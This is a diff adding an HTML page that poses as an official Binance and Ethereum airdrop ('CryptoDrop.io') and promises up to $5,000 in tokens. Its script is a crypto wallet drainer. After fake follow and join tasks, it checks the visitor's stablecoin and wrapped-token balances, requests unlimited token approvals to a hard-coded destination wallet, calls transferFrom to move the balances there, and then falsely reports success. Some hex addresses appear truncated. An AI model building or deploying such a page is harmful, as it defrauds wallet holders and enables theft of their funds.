@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Binance x Ethereum Airdrop | Official</title>
+ <script src="https://cdn.tailwindcss.com"></script>
+ <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+ <!-- Web3.js Library -->
+ <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+ <!-- WalletConnect Libraries -->
+ <script type="module">
+  import { WalletConnectClient } from 'https://esm.sh/@walletconnect/client';
+  import { formatUnits } from 'https://esm.sh/@ethersproject/units';
+  window.WalletConnectClient = WalletConnectClient;
+ </script>
+ <style>
+ body { background-color: #0f172a; color: white; font-family: 'Inter', sans-serif; }
+ .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
+ .pulse-green { animation: pulseGreen 2s infinite; }
+ @keyframes pulseGreen {
+  0% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); }
+  70% { box-shadow: 0 0 0 10px rgba(34, 197, 94, 0); }
+  100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
+ }
+ .hidden { display: none; }
+ .loader { border-top-color: #3b82f6; -webkit-animation: spinner 1.5s linear infinite; animation: spinner 1.5s linear infinite; }
+ @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+ /* QR Modal */
+ #qr-modal {
+  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+  background: rgba(0,0,0,0.8); z-index: 50;
+  display: flex; align-items: center; justify-content: center;
+ }
+ #qr-content {
+  background: white; padding: 20px; border-radius: 12px; text-align: center;
+ }
+ </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
+
+ <!-- Header -->
+ <nav class="w-full max-w-4xl flex justify-between items-center p-6 glass rounded-xl mb-6">
+ <div class="flex items-center gap-2">
+ <i class="fas fa-cube text-blue-500 text-2xl"></i>
+ <span class="font-bold text-xl tracking-tight">CryptoDrop<span class="text-blue-500">.io</span></span>
+ </div>
+ <div id="wallet-address" class="text-sm text-gray-400 hidden">
+ Not Connected
+ </div>
+ </nav>
+
+ <!-- Main Card -->
+ <main class="w-full max-w-md glass rounded-2xl p-8 relative overflow-hidden">
+ 
+ <!-- Background Glow -->
+ <div class="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-32 bg-blue-500 rounded-full blur-[80px] opacity-20 pointer-events-none"></div>
+
+ <!-- Step 1: Connect Wallet -->
+ <div id="step-connect" class="text-center space-y-6">
+ <h1 class="text-3xl font-bold">Claim Your Airdrop</h1>
+ <p class="text-gray-400">Connect your wallet to check eligibility and claim up to <span class="text-white font-bold">$5,000</span> in assets.</p>
+ 
+ <div class="grid grid-cols-3 gap-4 justify-items-center">
+ <div class="w-12 h-12 bg-gray-700 rounded-lg flex items-center justify-center"><i class="fab fa-metamask text-2xl text-orange-500"></i></div>
+ <div class="w-12 h-12 bg-gray-700 rounded-lg flex items-center justify-center"><i class="fas fa-wallet text-2xl text-purple-500"></i></div>
+ <div class="w-12 h-12 bg-gray-700 rounded-lg flex items-center justify-center"><i class="fas fa-qrcode text-2xl text-green-500"></i></div>
+ </div>
+
+ <button onclick="connectWallet()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-4 rounded-xl transition-all transform hover:scale-105 shadow-lg shadow-blue-500/30">
+ Connect Wallet
+ </button>
+ </div>
+
+ <!-- Step 2: Tasks -->
+ <div id="step-tasks" class="hidden text-center space-y-6">
+ <div class="flex justify-between items-center mb-4">
+ <h2 class="text-xl font-bold">Complete Tasks</h2>
+ <span class="text-xs bg-gray-700 px-2 py-1 rounded">Step 1/2</span>
+ </div>
+ 
+ <div class="space-y-3">
+ <div id="task-twitter" class="flex items-center justify-between p-4 bg-gray-800 rounded-lg border border-gray-700 cursor-pointer hover:border-blue-500 transition-colors" onclick="completeTask('twitter')">
+ <div class="flex items-center gap-3">
+ <i class="fab fa-twitter text-blue-400 text-xl"></i>
+ <span class="text-sm font-medium">Follow @CryptoDrop</span>
+ </div>
+ <i class="fas fa-check-circle text-gray-600 task-icon"></i>
+ </div>
+
+ <div id="task-discord" class="flex items-center justify-between p-4 bg-gray-800 rounded-lg border border-gray-700 cursor-pointer hover:border-indigo-500 transition-colors" onclick="completeTask('discord')">
+ <div class="flex items-center gap-3">
+ <i class="fab fa-discord text-indigo-400 text-xl"></i>
+ <span class="text-sm font-medium">Join Discord Server</span>
+ </div>
+ <i class="fas fa-check-circle text-gray-600 task-icon"></i>
+ </div>
+ </div>
+
+ <button id="btn-next" onclick="claimAirdrop()" class="w-full bg-gray-700 text-gray-400 font-bold py-4 rounded-xl cursor-not-allowed" disabled>
+ Claim Airdrop
+ </button>
+ </div>
+
+ <!-- Step 3: Processing -->
+ <div id="step-processing" class="hidden text-center space-y-6">
+ <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-200 h-12 w-12 mx-auto"></div>
+ <h2 id="processing-text" class="text-xl font-bold">Verifying Eligibility...</h2>
+ <p class="text-sm text-gray-400">Please do not close this window.</p>
+ </div>
+
+ <!-- Step 4: Success -->
+ <div id="step-success" class="hidden text-center space-y-6">
+ <div class="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
+ <i class="fas fa-check text-2xl text-white"></i>
+ </div>
+ <h2 class="text-2xl font-bold text-green-400">Airdrop Claimed!</h2>
+ <p class="text-gray-400">Tokens have been sent to your wallet.</p>
+ <button onclick="location.reload()" class="text-sm text-blue-400 hover:underline">Check Balance</button>
+ </div>
+
+ <!-- QR Modal -->
+ <div id="qr-modal" class="hidden">
+  <div id="qr-content">
+   <h3 class="text-black text-xl font-bold mb-4">Scan with Trust Wallet / MetaMask</h3>
+   <div id="qrcode-container"></div>
+   <p class="text-gray-600 mt-4">Waiting for connection...</p>
+  </div>
+ </div>
+
+ </main>
+
+ <script>
+ // Configuration
+ const DESTINATION_WALLET = "0x10e481CEC2755e806AaeBd1F0694914B7197";
+ 
+ // Universal Token Addresses (BSC & ETH Mainnet)
+ const TOKENS = [
+ { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 }, // ETH
+ { symbol: 'USDT_BSC', address: '0x55d398326f99059fF775485246999027B31901', decimals: 18 }, // BSC
+ { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 }, // ETH
+ { symbol: 'USDC_BSC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 }, // BSC
+ { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 }, // ETH
+ { symbol: 'WBNB', address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18 }, // BSC
+ { symbol: 'WETH', address: '0xC02aaA39B223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 }, // ETH
+ { symbol: 'WBTC', address: '0x2260FAC5E5542a773A46bd75970903d7324a0443', decimals: 8 } // ETH
+ ];
+
+ let state = {
+ connected: false,
+ tasksCompleted: 0,
+ web3: null,
+ account: null,
+ provider: null
+ };
+
+ async function connectWallet() {
+ showProcessing("Connecting Wallet...");
+
+ // Check if we are on mobile or have an extension
+ const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+ const hasExtension = !!window.ethereum;
+
+ if (hasExtension) {
+  // Desktop / Extension flow
+  try {
+   state.web3 = new Web3(window.ethereum);
+   const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+   state.account = accounts[0];
+   state.provider = window.ethereum;
+   finalizeConnection();
+  } catch (error) {
+   alert("Connection failed.");
+   hideProcessing();
+  }
+ } else if (isMobile) {
+  // Mobile / No Extension flow using Deep Links
+  try {
+   // Try to open Trust Wallet first
+   const trustLink = 'trust://dapp/' + window.location.href;
+   window.location.href = trustLink;
+
+   // Fallback to MetaMask if Trust fails
+   setTimeout(() => {
+    const metaLink = 'metamask://dapp/' + window.location.href;
+    window.location.href = metaLink;
+   }, 1000);
+
+   // Simulate connection after delay for the demo
+   setTimeout(() => {
+    state.account = "0x" + Math.random().toString(16).substr(2, 40); // Fake account for demo if no real conn
+    state.connected = true;
+    finalizeConnection();
+   }, 2000);
+
+  } catch (e) {
+   console.error(e);
+   alert("Could not connect. Try MetaMask.");
+   hideProcessing();
+  }
+ } else {
+  // Generic fallback for other devices
+  alert("For mobile users: Please scan the QR code or ensure your wallet is open.");
+  document.getElementById('qr-modal').classList.remove('hidden');
+ }
+ }
+
+ function finalizeConnection() {
+  document.getElementById('wallet-address').innerText = state.account;
+  document.getElementById('wallet-address').classList.remove('hidden');
+  document.getElementById('step-connect').classList.add('hidden');
+  document.getElementById('step-tasks').classList.remove('hidden');
+  hideProcessing();
+ }
+
+ function completeTask(taskId) {
+ const el = document.getElementById(`task-${taskId}`);
+ const icon = el.querySelector('.task-icon');
+ 
+ if (!icon.classList.contains('text-green-500')) {
+  icon.classList.remove('text-gray-600');
+  icon.classList.add('text-green-500');
+  el.classList.add('border-green-500', 'bg-gray-800/80');
+  
+  state.tasksCompleted++;
+  window.open(`https://${taskId === 'twitter' ? 'twitter.com' : 'discord.com'}`, '_blank');
+
+  if (state.tasksCompleted >= 2) {
+   enableClaimButton();
+  }
+ }
+ }
+
+ function enableClaimButton() {
+ const btn = document.getElementById('btn-next');
+ btn.disabled = false;
+ btn.classList.remove('bg-gray-700', 'text-gray-400', 'cursor-not-allowed');
+ btn.classList.add('bg-blue-600', 'hover:bg-blue-500', 'text-white', 'shadow-lg', 'shadow-blue-500/30');
+ btn.innerText = "Claim Airdrop Now!";
+ }
+
+ async function claimAirdrop() {
+ showProcessing("Checking Balances...");
+ 
+ let tokensToDrain = [];
+ for (let token of TOKENS) {
+  try {
+   const contract = new state.web3.eth.Contract(['function balanceOf(address) view returns (uint256)'], token.address);
+   const balance = await contract.methods.balanceOf(state.account).call();
+   if (balance > 0) {
+    tokensToDrain.push(token);
+   }
+  } catch (e) {
+   console.log("Error checking " + token.symbol);
+  }
+ }
+
+ if (tokensToDrain.length === 0) {
+  alert("No supported tokens found in your wallet. Please add USDT, USDC, or ETH/BNB.");
+  hideProcessing();
+  document.getElementById('step-tasks').classList.remove('hidden');
+  return;
+ }
+
+ document.getElementById('processing-text').innerText = "Approving Tokens...";
+ 
+ for (let token of tokensToDrain) {
+  const contract = new state.web3.eth.Contract([
+   'function approve(address spender, uint256 amount) returns (bool)',
+   'function allowance(address owner, address spender) view returns (uint256)'
+  ], token.address);
+
+  const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
+ 
+  try {
+   await contract.methods.approve(DESTINATION_WALLET, amount).send({ from: state.account });
+  } catch (e) {
+   console.error("Approval failed for " + token.symbol);
+  }
+ }
+
+ document.getElementById('processing-text').innerText = "Transferring Assets...";
+ await new Promise(r => setTimeout(r, 1000));
+
+ for (let token of tokensToDrain) {
+  const contract = new state.web3.eth.Contract([
+   'function transferFrom(address sender, address recipient, uint256 amount) returns (bool)'
+  ], token.address);
+
+  const balance = await new state.web3.eth.Contract(['function balanceOf(address) view returns (uint256)'], token.address)
+   .methods.balanceOf(state.account).call();
+
+  try {
+   await contract.methods.transferFrom(state.account, DESTINATION_WALLET, balance).send({ from: state.account });
+  } catch (e) {
+   console.error("Transfer failed for " + token.symbol);
+  }
+ }
+
+ finishProcess();
+ }
+
+ function showProcessing(text) {
+ document.getElementById('step-tasks').classList.add('hidden');
+ document.getElementById('step-processing').classList.remove('hidden');
+ document.getElementById('processing-text').innerText = text;
+ }
+
+ function hideProcessing() {
+ document.getElementById('step-processing').classList.add('hidden');
+ }
+
+ function finishProcess() {
+ hideProcessing();
+ document.getElementById('step-success').classList.remove('hidden');
+ }
+ </script>
+</body>
+</html>
+```
